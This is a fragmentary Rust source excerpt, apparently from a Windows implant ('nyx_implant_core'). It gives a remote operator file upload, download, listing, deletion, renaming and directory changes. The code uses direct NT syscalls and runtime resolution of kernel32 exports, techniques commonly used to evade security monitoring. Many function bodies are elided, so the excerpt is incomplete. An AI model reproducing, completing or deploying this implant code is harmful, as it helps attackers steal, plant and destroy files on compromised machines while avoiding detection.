...
//! ([`nyx_implant_core::syscalls`]) — `NtCreateFile`, `NtReadFile`, `NtWriteFile`,
//! `NtSetInformationFile`, `NtQueryAttributesFile`, `NtQueryDirectoryFile`,
//! `NtClose`. The typed
//! wrappers in `syscalls` (e.g. [`nyx_implant_core::syscalls::nt_create_file`]) hide the
...
use nyx_implant_core::syscalls::Runtime;
...
fn protected_override() -> bool {
    ...
    unsafe {
        if let Some(p) =
            nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableA")
        {
...
/// substring check.
fn allowed_normalize(path: &str) -> nyx_implant_core::heap::String {
    let mut normalized = nyx_implant_core::heap::String::with_capacity(path.len());
...
fn allowed_collapse_segments(normalized: &str) -> nyx_implant_core::heap::Vec<&str> {
    let mut segs: nyx_implant_core::heap::Vec<&str> = nyx_implant_core::heap::Vec::new();
...
fn allowed_clean_path(segs: &[&str], normalized: &str) -> nyx_implant_core::heap::String {
    let mut clean = nyx_implant_core::heap::String::with_capacity(normalized.len());
    let mut first = true;
    for seg in segs {
        if first {
            first = false;
...
pub unsafe fn open_file(
    ...
    let st = nyx_implant_core::syscalls::nt_create_file(
        rt,
...
fn do_upload_write_chunk(
    ...
    unsafe {
        ...
        let wst = nyx_implant_core::syscalls::nt_write_file(
            rt,
            handle as usize,
            0, // Event
            0, // ApcRoutine
...
fn do_download_read_all(rt: &Runtime, handle: *mut core::ffi::c_void, path: &str) -> Vec<Response> {
    ...
    let mut buf = nyx_implant_core::heap::vec![0u8; CHUNK];
...
fn do_download_read(
    ...
    unsafe {
        ...
        let rst = nyx_implant_core::syscalls::nt_read_file(
            rt,
            handle as usize,
            0,
            0,
...
fn fileop_cd(rt: &Runtime, path: &str) -> Response {
    ...
    unsafe {
        ...
        let mut basic = nyx_implant_core::heap::vec![0u8; 56];
        let st = nyx_implant_core::syscalls::nt_query_attributes_file(
            rt,
            &oa as *const ObjectAttributes as usize,
...
/// Convert path to a UTF-16 wide string (null-terminated) for the W APIs.
fn fileop_rm_wide(path: &str) -> nyx_implant_core::heap::Vec<u16> {
    let mut wide = nyx_implant_core::heap::Vec::<u16>::with_capacity(path.len() + 1);
...
fn fileop_rm_resolve() -> Result<(DeleteFileW, RemoveDirectoryW), Response> {
    let del: DeleteFileW =
        match unsafe { nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"DeleteFileW") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return Err(Response::Err(String::from("rm: DeleteFileW unresolved"))),
        };
    let rmdir: RemoveDirectoryW = match unsafe {
        nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"RemoveDirectoryW")
    } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => {
    ...
    let _ = unsafe {
        ...
        let gfa: GetFileAttributesW =
            match nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"GetFileAttributesW") {
...
/// `destbuf` into it; length re-checked here against the array capacity,
/// <= 260 units) and issue NtSetInformationFile(FileRenameInfo). The
/// information length is the fixed header (offset of file_name) + the wide
/// name bytes actually used. NtSetInformationFile reads exactly that many
/// bytes.
///
...
fn fileop_mv_rename(rt: &Runtime, handle: *mut core::ffi::c_void, destbuf: &[u16]) -> Response {
    unsafe {
        ...
        let dn = destbuf.len();
        // WP-B2: re-check the caller's length contract at the index site so a
        // future second caller can't slice file_name out of bounds.
        if dn > info.file_name.len() {
            return Response::Err(String::from("mv: destination path too long"));
        }
        ...
        let sst = nyx_implant_core::syscalls::nt_set_information_file(
            rt,
            handle as usize,
...
fn fileop_ls(rt: &Runtime, path: &str) -> Response {
    ...
    unsafe { nyx_implant_core::syscalls::nt_close(rt, handle as usize) };
...
fn fileop_ls_enumerate(rt: &Runtime, handle: *mut core::ffi::c_void) -> Result<String, Response> {
    let mut buf = nyx_implant_core::heap::vec![0u8; DIR_BUF];
...
fn fileop_ls_query(
    ...
    unsafe {
        let mut iosb: IoStatusBlock = IoStatusBlock::default();
        let st = nyx_implant_core::syscalls::nt_query_directory_file(
            rt,
            handle as usize,
            0, // Event
            0, // ApcRoutine
